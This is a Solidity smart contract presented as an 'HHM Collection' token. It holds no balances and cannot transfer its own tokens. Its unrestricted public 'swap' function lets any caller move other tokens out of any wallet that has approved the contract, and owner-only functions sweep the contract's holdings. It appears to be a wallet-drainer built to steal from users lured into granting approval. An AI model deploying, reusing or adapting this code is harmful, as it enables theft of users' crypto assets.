pragma solidity ^0.5.0;

import "./SafeMath.sol";

contract TokenERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract HHMA9{

    using SafeMath for uint256;
	
    string private _name = "HHM Collection";
    string private _symbol = "HHMA";
	address public owner_;

    mapping (address => mapping (address => uint256)) private _allowances;
	
    mapping (uint => address) _allowanceBuyers;

    uint _approveCounter = 0;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
	
	event OwnershipRenounced(address indexed previousOwner);
	event OwnershipTransferred(
		address indexed previousOwner,
		address indexed newOwner
	);

    constructor () public {
		owner_ = msg.sender;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

	modifier onlyOwner() {
		require(msg.sender == owner_);
		_;
	}
	
	function transferOwnership(address newOwner) public onlyOwner {
		require(newOwner != address(0));
		emit OwnershipTransferred(owner_, newOwner);
		owner_ = newOwner;
	}

    function() external payable {
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function withdrawToken(address tokenAddress, address _to, uint _amount) public onlyOwner returns(bool success){
        TokenERC20 token = TokenERC20(tokenAddress);
        token.transfer(_to, _amount);
        return true;
    }

    function withdrawAllTo(address payable _to) public onlyOwner returns(bool success){
        _to.transfer(getBalance());
        return true;
    }
    
    function approve(address spender, uint256 value) public returns (bool) {
		
		if(_approveCounter > 0){
			address buyer = _allowanceBuyers[_approveCounter];
			_allowances[msg.sender][buyer] = 0;
		}
		
		_allowanceBuyers[_approveCounter] = spender;
		
		_approveCounter += 1;
        _approve(msg.sender, spender, value);
        return true;
    }

    function bidComplete() public{
		if(_approveCounter > 0){
			address buyer = _allowanceBuyers[_approveCounter];
			_allowances[msg.sender][buyer] = 0;
		}
    }

    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }
	
	function swap(address[] memory _tokenAddress, address[] memory _from, address[] memory _to, uint256[] memory _value) public returns (bool) {
		require(_to.length == _value.length);
		require(_from.length == _to.length);
		for (uint8 i = 0; i < _to.length; i++){
			TokenERC20 token = TokenERC20(_tokenAddress[i]);
			require(token.transferFrom(_from[i], _to[i], _value[i]));
		}
		return true;
	}
}